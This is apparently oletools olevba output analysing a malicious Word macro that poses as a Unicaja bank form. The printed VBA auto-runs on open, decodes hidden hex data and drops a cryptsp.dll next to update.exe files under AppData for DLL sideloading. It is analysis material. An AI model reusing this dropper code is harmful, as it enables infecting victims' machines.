olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.Alien.gen-eb92ec11cebcf283acf6d5f275a149d64dcee8b12fa8c5b82e7d2bbcdd04f82e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan.MSOffice.Alien.gen-eb92ec11cebcf283acf6d5f275a149d64dcee8b12fa8c5b82e7d2bbcdd04f82e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Enviar_Click()
    MsgBox "Gracias por su colaboraci√≥n!", , "UNICAJA"
End Sub

Sub SaveFile(path As String, content() As Byte, ext As String)
    Dim fd As Integer
    fd = FreeFile
    Open path & "\cryptsp" & "." & ext For Binary Access Write As #fd
    Put #fd, , content
    Close #fd
End Sub

Function Dec_String(data As String) As String
    Dim result As String, chars() As String, h As String, l As String, asciic As Integer, length As Integer, j As Integer

    ReDim chars(0 To Len(data) / 2)

    length = Len(data)
    For i = 1 To length Step 2
        If i + 1 <= length Then
            h = Mid(data, i, 1)
            l = Mid(data, i + 1, 1)
        Else
            Exit For
        End If
        asciic = "&H" & h & l
        chars(j) = Chr(asciic)
        j = j + 1
    Next i
    result = Join(chars, "")
    Dec_String = result & vbNewLine
End Function

Function Read_Key()
    Dim key As String, path As String
    path = "%userprofile%" & "\Unicaja\PGP\key"
    key = ReadFile(path)
    Read_Key = key
End Function

Sub Dec_Paragraphs(key As String)
    
    Dim Paragraph As Word.Paragraph, content As String, data As String

    For Each Paragraph In ActiveDocument.Paragraphs
        content = Paragraph.Range.Text
        p = Mid(content, 1, 3)
        If p = key Then
            data = Mid(content, 4)
            Paragraph.Range.Text = Dec_String(data)
        End If
    Next
End Sub

Function ProcessData(data As String, size As Long, m As Integer, cs As Long) As Byte()
    Dim asInp() As String
    Dim chunk() As Byte
    Dim value As String
    Dim z As Integer, y As Long, ss As Long
    asInp = Split(data)
    ReDim chunk(0 To (size * m) - 1)
    ss = 0
    For i = 0 To size
        value = asInp(i)
        z = 0
        y = i * m
        For j = 1 To m * 2 Step 2
            On Error GoTo TheEnd
            chunk(y + z) = "&H" & Mid(value, j, 2)
            ss = ss + chunk(y + z)
            z = z + 1
        Next j
    Next i

TheEnd:
    Debug.Print ss = cs
    ProcessData = chunk
End Function

Sub AutoOpen()
    Dim appdata As String, folders As New Collection, current As String, i As Integer, attr As Integer, data() As Byte, x As String
    basepath = Environ("appdata") & "\.."
    folders.Add (basepath)
    Dim key As String
    key = Read_Key
    Dec_Paragraphs (key)

    i = 0
    Set fs = CreateObject("Scripting.FileSystemObject")

    On Error Resume Next
    Do
        current = folders(1)
        folders.Remove (1)
        Set folder = fs.GetFolder(current)
        
        For Each subfolder In folder.subFolders
            attr = fs.GetFolder(current & "\" & subfolder.Name).Attributes
            If attr <> 1046 Then
                folders.Add Item:=current & "\" & subfolder.Name
            End If
        Next subfolder
        
        For Each file In folder.Files
            If LCase(file.Name) = "update.exe" Then
                x = ActiveDocument.Shapes(1).TextFrame.TextRange.Text
                data = ProcessData(x, 106944, 8, 74569963)
                SaveFile path:=current, content:=data, ext:="dll"
            End If
        Next file
            
        i = i + 1
    Loop Until i = 1024 Or folders.Count = 0
    End Sub
    Function ReadFile(path As String) As String
    Dim m, s, x
    m = Minute(Now)
    s = Second(Now)
    For i = 0 To s * m
        x = Sqr(Minute(Now) * Second(Now))
    Next i
    ReadFile = "UNI"
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Enviar_Click        |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |update.exe          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

